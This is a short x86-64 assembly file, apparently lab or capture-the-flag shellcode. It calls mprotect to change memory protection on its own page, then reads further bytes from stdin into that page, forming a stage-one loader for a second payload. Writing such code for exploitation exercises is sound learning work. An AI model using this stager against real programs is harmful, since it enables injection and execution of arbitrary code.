.global _start
_start:
.intel_syntax noprefix

# STARTING FIXED REGISTERS:
    # rax =   0   = 0x0
    # rdx =   0x2f8f1000 = starting rip
    # r8  =   22  = 0x16
    # r9  =   3   = 0x3 
    # r11 =   582 = 0x246

#UNPROTECT MEMORY
# rax = 10
# rdi = start = rip
# rsi = size
# rdx = prot
    mov al, 10
    mov edi, edx
    xchg edx, r9d
    syscall

#READ
# rax = 0
# rdi = fd = 0
# rsi = buffer = rip
# rdx = size
    xor eax, eax
    xor edi, edi
    mov esi, r9d
    syscall
